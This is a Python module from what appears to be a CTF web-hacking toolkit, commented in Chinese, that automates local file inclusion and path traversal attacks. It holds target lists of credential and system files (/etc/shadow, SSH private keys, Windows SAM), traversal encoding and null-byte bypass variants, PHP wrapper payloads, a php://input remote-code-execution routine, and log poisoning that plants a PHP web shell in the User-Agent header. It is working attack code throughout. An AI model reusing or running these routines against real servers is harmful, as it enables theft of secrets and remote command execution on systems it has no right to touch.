"""
CTF Web Toolkit - LFI / Path Traversal Module
支持：路径穿越 / PHP Wrapper / Log Poisoning / /proc 信息读取
"""

import re
from typing import Optional, List
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section

# ── 常用目标文件 ──────────────────────────────
SENSITIVE_FILES = {
    "linux": [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/os-release",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/maps",
        "/proc/version",
        "/proc/net/tcp",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        "/root/.ssh/id_rsa",
        "/root/.bash_history",
        "/home/www-data/.bash_history",
        "/var/www/html/index.php",
        "/var/www/html/config.php",
    ],
    "windows": [
        "C:/Windows/win.ini",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/inetpub/wwwroot/web.config",
        "C:/Windows/repair/sam",
        "C:/boot.ini",
    ],
}

# ── 路径穿越变体 ──────────────────────────────
TRAVERSAL_VARIANTS = [
    "../",
    "..%2f",
    "..%252f",
    "..%c0%af",
    "..%c1%9c",
    "....//",
    "..../////",
    "..\\/",
    "..%5c",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2F",
    "..%5C",
    ".%2e/",
    "%2e./",
]

# ── PHP Wrapper ───────────────────────────────
PHP_WRAPPERS = {
    "base64_read": "php://filter/convert.base64-encode/resource={file}",
    "rot13_read":  "php://filter/read=string.rot13/resource={file}",
    "string_read": "php://filter/read=string.strip_tags/resource={file}",
    "zlib_read":   "php://filter/zlib.deflate/convert.base64-encode/resource={file}",
    "data_rce":    "data://text/plain;base64,{b64}",      # 需 allow_url_include=On
    "expect_rce":  "expect://{cmd}",                       # 需 expect 扩展
    "input_rce":   "php://input",                          # POST body 作为 PHP 执行
    "stdin_rce":   "php://stdin",
}

# ── PHP Filter Chain Gadget（任意文件写入）────
FILTER_CHAIN_PREFIX = "php://filter/"

# 常见 Null Byte 截断
NULL_BYTES = ["%00", "\x00", "\\0", "%2500"]


class LFIScanner:
    def __init__(self, requester: Requester):
        self.req = requester

    def detect(self, url: str, param: str, method: str = "GET") -> bool:
        """检测路径穿越 / LFI"""
        section(f"LFI 检测: {param}")
        # 使用 /etc/passwd 作为目标
        for depth in [1, 2, 3, 4, 5, 6]:
            for variant in ["../", "..%2f", "....//", "%2e%2e%2f"]:
                payload = variant * depth + "etc/passwd"
                resp = _send(self.req, url, param, payload, method)
                if resp and _is_passwd(resp.text):
                    found("LFI", f"payload={payload!r}")
                    return True
                # 加 null byte 截断
                for nb in NULL_BYTES[:2]:
                    resp = _send(self.req, url, param, payload + nb, method)
                    if resp and _is_passwd(resp.text):
                        found("LFI+NullByte", f"{payload}{nb}")
                        return True
        info("未发现路径穿越")
        return False

    def read_file(self, url: str, param: str, filepath: str,
                  method: str = "GET", max_depth: int = 8) -> Optional[str]:
        """尝试读取指定文件"""
        section(f"读取文件: {filepath}")
        filename = filepath.lstrip("/")

        # 直接路径
        resp = _send(self.req, url, param, filepath, method)
        if resp and len(resp.text) > 20:
            return resp.text

        # 路径穿越
        for depth in range(1, max_depth + 1):
            for variant in TRAVERSAL_VARIANTS[:6]:
                payload = variant * depth + filename
                resp = _send(self.req, url, param, payload, method)
                if resp and _has_content(resp.text):
                    found("文件读取", f"深度={depth} 变体={variant!r}")
                    return resp.text

        # Null byte 截断
        for depth in range(1, 5):
            payload = "../" * depth + filename
            for nb in NULL_BYTES:
                resp = _send(self.req, url, param, payload + nb, method)
                if resp and _has_content(resp.text):
                    found("文件读取(NullByte)", payload + nb)
                    return resp.text

        info(f"无法读取: {filepath}")
        return None

    def php_filter_read(self, url: str, param: str, filepath: str,
                        method: str = "GET") -> Optional[str]:
        """使用 PHP Wrapper 读取文件源码"""
        section(f"PHP Filter 读取: {filepath}")
        import base64

        payload = PHP_WRAPPERS["base64_read"].format(file=filepath)
        resp = _send(self.req, url, param, payload, method)
        if resp and resp.text.strip():
            # 尝试解码 base64
            try:
                # 提取可能的 base64 内容
                b64_match = re.search(r'[A-Za-z0-9+/=]{20,}', resp.text)
                if b64_match:
                    decoded = base64.b64decode(b64_match.group() + "==").decode(errors="replace")
                    if len(decoded) > 10:
                        found("PHP Filter", f"读取 {filepath} 成功")
                        return decoded
            except Exception:
                pass
            return resp.text

        # 尝试 rot13
        payload = PHP_WRAPPERS["rot13_read"].format(file=filepath)
        resp = _send(self.req, url, param, payload, method)
        if resp and resp.text.strip():
            return resp.text

        return None

    def php_input_rce(self, url: str, param: str, cmd: str) -> Optional[str]:
        """通过 php://input 执行代码（需要 allow_url_include=On）"""
        section(f"php://input RCE: {cmd}")
        php_code = f"<?php system('{cmd}'); ?>"
        resp = self.req.post(url, data=php_code,
                             params={param: "php://input"},
                             headers={"Content-Type": "application/x-www-form-urlencoded"})
        if resp and resp.text.strip():
            found("php://input RCE", resp.text[:200])
            return resp.text
        return None

    def log_poison(self, url: str, param: str, log_file: str,
                   cmd: str = "id", method: str = "GET") -> Optional[str]:
        """
        日志投毒 RCE：
        1. 发送含 PHP 代码的请求（注入 User-Agent 或 URL）
        2. 包含日志文件触发执行
        """
        section(f"日志投毒: {log_file}")
        # 步骤1：注入 PHP 代码到 User-Agent
        php_payload = f"<?php system($_GET['cmd']); ?>"
        self.req.set_header("User-Agent", php_payload)
        self.req.get(url)
        self.req.set_header("User-Agent",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")

        # 步骤2：包含日志文件 + 执行命令
        resp = _send(self.req, url, param, log_file, method,
                     extra_params={"cmd": cmd})
        if resp and _has_command_output(resp.text):
            found("日志投毒 RCE", resp.text[:200])
            return resp.text
        info("日志投毒未成功（可能无写权限或文件不存在）")
        return None

    def scan_sensitive(self, url: str, param: str,
                       os_type: str = "linux", method: str = "GET") -> List[str]:
        """批量扫描敏感文件"""
        section(f"敏感文件扫描 ({os_type})")
        found_files = []
        files = SENSITIVE_FILES.get(os_type, [])
        for f in files:
            content = self.read_file(url, param, f, method)
            if content:
                ok(f"  {f}")
                found_files.append(f)
        return found_files

    def generate_filter_chain(self, base_file: str = "index.php") -> List[str]:
        """生成 PHP Filter Chain 变体（用于绕过过滤）"""
        chains = []
        for name, template in PHP_WRAPPERS.items():
            if "{file}" in template:
                chains.append(template.format(file=base_file))
        return chains


# ── 内部辅助 ─────────────────────────────────
def _send(req: Requester, url: str, param: str, payload: str,
          method: str, extra_params: dict = None):
    try:
        params = {param: payload}
        if extra_params:
            params.update(extra_params)
        if method.upper() == "GET":
            return req.get(url, params=params)
        else:
            return req.post(url, data=params)
    except Exception as e:
        err(f"请求失败: {e}")
        return None


def _is_passwd(text: str) -> bool:
    return "root:" in text and ":/bin/" in text


def _has_content(text: str) -> bool:
    return len(text.strip()) > 30


def _has_command_output(text: str) -> bool:
    indicators = ["uid=", "gid=", "groups=", "root", "www-data"]
    return any(i in text for i in indicators)
